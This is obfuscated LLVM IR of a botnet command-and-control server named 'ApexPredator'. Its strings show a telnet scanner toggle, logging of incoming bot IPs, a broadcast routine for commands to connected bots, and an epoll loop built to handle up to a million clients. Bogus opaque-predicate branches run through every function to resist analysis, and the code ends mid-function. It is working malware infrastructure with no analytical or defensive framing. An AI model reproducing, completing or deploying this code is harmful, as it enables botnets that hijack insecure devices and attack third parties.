@.str.197 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.199 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.201 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.202 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.203 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.204 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.205 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.206 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.207 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.208 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Screening Error\00", align 1
@.str.209 = private unnamed_addr constant [62 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From \00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.211 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.212 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.213 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.214 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.215 = private unnamed_addr constant [111 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.216 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.218 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.220 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.221 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.222 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x
  %5 = load i32, i32* @y
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 1, i32* %16, align 4
  %17 = load i32, i32* @x
  %18 = load i32, i32* @y
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %59, %originalBBpart2
  %26 = load i32, i32* %16, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %41

; <label>:28:                                     ; preds = %25
  %29 = load i32, i32* %15, align 4
  %30 = load i32, i32* %13, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %12, align 8
  %34 = load i32, i32* %15, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 10
  br label %41

; <label>:41:                                     ; preds = %32, %28, %25
  %42 = phi i1 [ false, %28 ], [ false, %25 ], [ %40, %32 ]
  %43 = load i32, i32* @x
  %44 = load i32, i32* @y
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %51 = load i32, i32* @x
  %52 = load i32, i32* @y
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %59, label %69

; <label>:59:                                     ; preds = %originalBBpart24
  %60 = load i32, i32* %14, align 4
  %61 = load i8*, i8** %12, align 8
  %62 = load i32, i32* %15, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = call i64 @read(i32 %60, i8* %64, i64 1)
  %66 = trunc i64 %65 to i32
  store i32 %66, i32* %16, align 4
  %67 = load i32, i32* %15, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %15, align 4
  br label %25

; <label>:69:                                     ; preds = %originalBBpart24
  %70 = load i32, i32* %16, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %3
  %71 = alloca i8*, align 8
  %72 = alloca i32, align 4
  %73 = alloca i32, align 4
  %74 = alloca i32, align 4
  %75 = alloca i32, align 4
  store i8* %0, i8** %71, align 8
  store i32 %1, i32* %72, align 4
  store i32 %2, i32* %73, align 4
  store i32 0, i32* %74, align 4
  store i32 1, i32* %75, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  br label %originalBB1
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = load i32, i32* @x.1
  %3 = load i32, i32* @y.2
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i8* %0, i8** %10, align 8
  store i32 0, i32* %12, align 4
  %14 = load i8*, i8** %10, align 8
  %15 = call i64 @strlen(i8* %14) #8
  %16 = sub i64 %15, 1
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %13, align 4
  %18 = load i32, i32* @x.1
  %19 = load i32, i32* @y.2
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart225, %originalBBpart2
  %27 = load i32, i32* @x.1
  %28 = load i32, i32* @y.2
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %26
  %35 = load i8*, i8** %10, align 8
  %36 = load i32, i32* %12, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #8
  %42 = icmp ne i32 %41, 0
  %43 = load i32, i32* @x.1
  %44 = load i32, i32* @y.2
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %42, label %51, label %70

; <label>:51:                                     ; preds = %originalBBpart212
  %52 = load i32, i32* @x.1
  %53 = load i32, i32* @y.2
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %51
  %60 = load i32, i32* %12, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %12, align 4
  %62 = load i32, i32* @x.1
  %63 = load i32, i32* @y.2
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart225, label %originalBB14alteredBB

originalBBpart225:                                ; preds = %originalBB14
  br label %26

; <label>:70:                                     ; preds = %originalBBpart212
  br label %71

; <label>:71:                                     ; preds = %originalBBpart242, %70
  %72 = load i32, i32* %13, align 4
  %73 = load i32, i32* %12, align 4
  %74 = icmp sge i32 %72, %73
  br i1 %74, label %75, label %100

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @x.1
  %77 = load i32, i32* @y.2
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %75
  %84 = load i8*, i8** %10, align 8
  %85 = load i32, i32* %13, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  %88 = load i8, i8* %87, align 1
  %89 = sext i8 %88 to i32
  %90 = call i32 @isspace(i32 %89) #8
  %91 = icmp ne i32 %90, 0
  %92 = load i32, i32* @x.1
  %93 = load i32, i32* @y.2
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %100

; <label>:100:                                    ; preds = %originalBBpart229, %71
  %101 = phi i1 [ false, %71 ], [ %91, %originalBBpart229 ]
  br i1 %101, label %102, label %121

; <label>:102:                                    ; preds = %100
  %103 = load i32, i32* @x.1
  %104 = load i32, i32* @y.2
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %102
  %111 = load i32, i32* %13, align 4
  %112 = add nsw i32 %111, -1
  store i32 %112, i32* %13, align 4
  %113 = load i32, i32* @x.1
  %114 = load i32, i32* @y.2
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart242, label %originalBB31alteredBB

originalBBpart242:                                ; preds = %originalBB31
  br label %71

; <label>:121:                                    ; preds = %100
  %122 = load i32, i32* @x.1
  %123 = load i32, i32* @y.2
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %121
  %130 = load i32, i32* %12, align 4
  store i32 %130, i32* %11, align 4
  %131 = load i32, i32* @x.1
  %132 = load i32, i32* @y.2
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %139

; <label>:139:                                    ; preds = %171, %originalBBpart246
  %140 = load i32, i32* @x.1
  %141 = load i32, i32* @y.2
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %139
  %148 = load i32, i32* %11, align 4
  %149 = load i32, i32* %13, align 4
  %150 = icmp sle i32 %148, %149
  %151 = load i32, i32* @x.1
  %152 = load i32, i32* @y.2
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %150, label %159, label %174

; <label>:159:                                    ; preds = %originalBBpart250
  %160 = load i8*, i8** %10, align 8
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = load i8*, i8** %10, align 8
  %166 = load i32, i32* %11, align 4
  %167 = load i32, i32* %12, align 4
  %168 = sub nsw i32 %166, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8, i8* %165, i64 %169
  store i8 %164, i8* %170, align 1
  br label %171

; <label>:171:                                    ; preds = %159
  %172 = load i32, i32* %11, align 4
  %173 = add nsw i32 %172, 1
  store i32 %173, i32* %11, align 4
  br label %139

; <label>:174:                                    ; preds = %originalBBpart250
  %175 = load i8*, i8** %10, align 8
  %176 = load i32, i32* %11, align 4
  %177 = load i32, i32* %12, align 4
  %178 = sub nsw i32 %176, %177
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds i8, i8* %175, i64 %179
  store i8 0, i8* %180, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %181 = alloca i8*, align 8
  %182 = alloca i32, align 4
  %183 = alloca i32, align 4
  %184 = alloca i32, align 4
  store i8* %0, i8** %181, align 8
  store i32 0, i32* %183, align 4
  %185 = load i8*, i8** %181, align 8
  %186 = call i64 @strlen(i8* %185) #8
  %_ = sub i64 0, %186
  %gen = add i64 %_, 1
  %_1 = sub i64 0, %186
  %gen2 = add i64 %_1, 1
  %_3 = shl i64 %186, 1
  %_4 = sub i64 0, %186
  %gen5 = add i64 %_4, 1
  %_6 = sub i64 0, %186
  %gen7 = add i64 %_6, 1
  %_8 = sub i64 0, %186
  %gen9 = add i64 %_8, 1
  %187 = sub i64 %186, 1
  %188 = trunc i64 %187 to i32
  store i32 %188, i32* %184, align 4
  br label %originalBB

originalBB10alteredBB:                            ; preds = %originalBB10, %26
  %189 = load i8*, i8** %10, align 8
  %190 = load i32, i32* %12, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8, i8* %189, i64 %191
  %193 = load i8, i8* %192, align 1
  %194 = sext i8 %193 to i32
  %195 = call i32 @isspace(i32 %194) #8
  %196 = icmp ne i32 %195, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %51
  %197 = load i32, i32* %12, align 4
  %_15 = sub i32 0, %197
  %gen16 = add i32 %_15, 1
  %_17 = shl i32 %197, 1
  %_18 = sub i32 0, %197
  %gen19 = add i32 %_18, 1
  %_20 = sub i32 0, %197
  %gen21 = add i32 %_20, 1
  %_22 = sub i32 0, %197
  %gen23 = add i32 %_22, 1
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %12, align 4
  br label %originalBB14

originalBB27alteredBB:                            ; preds = %originalBB27, %75
  %199 = load i8*, i8** %10, align 8
  %200 = load i32, i32* %13, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i8, i8* %199, i64 %201
  %203 = load i8, i8* %202, align 1
  %204 = sext i8 %203 to i32
  %205 = call i32 @isspace(i32 %204) #8
  %206 = icmp ne i32 %205, 0
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %102
  %207 = load i32, i32* %13, align 4
  %_32 = sub i32 0, %207
  %gen33 = add i32 %_32, -1
  %_34 = sub i32 %207, -1
  %gen35 = mul i32 %_34, -1
  %_36 = sub i32 %207, -1
  %gen37 = mul i32 %_36, -1
  %_38 = sub i32 %207, -1
  %gen39 = mul i32 %_38, -1
  %_40 = shl i32 %207, -1
  %208 = add nsw i32 %207, -1
  store i32 %208, i32* %13, align 4
  br label %originalBB31

originalBB44alteredBB:                            ; preds = %originalBB44, %121
  %209 = load i32, i32* %12, align 4
  store i32 %209, i32* %11, align 4
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %139
  %210 = load i32, i32* %11, align 4
  %211 = load i32, i32* %13, align 4
  %212 = icmp sle i32 %210, %211
  br label %originalBB48
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

; <label>:17:                                     ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias i8* @malloc(i64 %20) #7
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %25, i32 1, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #7
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #7
  %31 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #7
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

; <label>:35:                                     ; preds = %77, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %80

; <label>:38:                                     ; preds = %35
  %39 = load i32, i32* @x.3
  %40 = load i32, i32* @y.4
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = load i32, i32* %12, align 4
  %48 = load i32, i32* %5, align 4
  %49 = icmp eq i32 %47, %48
  %50 = load i32, i32* @x.3
  %51 = load i32, i32* @y.4
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %75, label %58

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = load i32, i32* %12, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %60
  %62 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %61, i32 0, i32 2
  %63 = load i8, i8* %62, align 1
  %64 = icmp ne i8 %63, 0
  br i1 %64, label %76, label %65

; <label>:65:                                     ; preds = %58
  %66 = load i32, i32* %7, align 4
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %75, label %68

; <label>:68:                                     ; preds = %65
  %69 = load i32, i32* %12, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %70
  %72 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %71, i32 0, i32 1
  %73 = load i32, i32* %72, align 4
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %76, label %75

; <label>:75:                                     ; preds = %68, %65, %originalBBpart2
  br label %77

; <label>:76:                                     ; preds = %68, %58
  br label %77

; <label>:77:                                     ; preds = %76, %75
  %78 = load i32, i32* %12, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %12, align 4
  br label %35

; <label>:80:                                     ; preds = %35
  %81 = load i8*, i8** %8, align 8
  call void @free(i8* %81) #7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %38
  %82 = load i32, i32* %12, align 4
  %83 = load i32, i32* %5, align 4
  %84 = icmp eq i32 %82, %83
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %18 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %5, align 8
  br label %20

; <label>:20:                                     ; preds = %520, %1
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %23 = call i32 @epoll_wait(i32 %21, %struct.epoll_event* %22, i32 1000000, i32 -1)
  store i32 %23, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %24

; <label>:24:                                     ; preds = %517, %20
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i32, i32* %8, align 4
  %34 = load i32, i32* %7, align 4
  %35 = icmp slt i32 %33, %34
  %36 = load i32, i32* @x.5
  %37 = load i32, i32* @y.6
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %35, label %44, label %520

; <label>:44:                                     ; preds = %originalBBpart2
  %45 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i64 %47
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = and i32 %50, 8
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %71, label %53

; <label>:53:                                     ; preds = %44
  %54 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %55 = load i32, i32* %8, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i64 %56
  %58 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 1
  %60 = and i32 %59, 16
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %71, label %62

; <label>:62:                                     ; preds = %53
  %63 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %64 = load i32, i32* %8, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %63, i64 %65
  %67 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 1
  %69 = and i32 %68, 1
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %90, label %71

; <label>:71:                                     ; preds = %62, %53, %44
  %72 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i64 %74
  %76 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %75, i32 0, i32 1
  %77 = bitcast %union.epoll_data* %76 to i32*
  %78 = load i32, i32* %77, align 1
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %79
  %81 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %80, i32 0, i32 2
  store i8 0, i8* %81, align 1
  %82 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i64 %84
  %86 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %85, i32 0, i32 1
  %87 = bitcast %union.epoll_data* %86 to i32*
  %88 = load i32, i32* %87, align 1
  %89 = call i32 @close(i32 %88)
  br label %517

; <label>:90:                                     ; preds = %62
  %91 = load volatile i32, i32* @listenFD, align 4
  %92 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %93 = load i32, i32* %8, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %92, i64 %94
  %96 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %95, i32 0, i32 1
  %97 = bitcast %union.epoll_data* %96 to i32*
  %98 = load i32, i32* %97, align 1
  %99 = icmp eq i32 %91, %98
  br i1 %99, label %100, label %249

; <label>:100:                                    ; preds = %90
  br label %101

; <label>:101:                                    ; preds = %originalBBpart220, %100
  store i32 16, i32* %10, align 4
  %102 = load volatile i32, i32* @listenFD, align 4
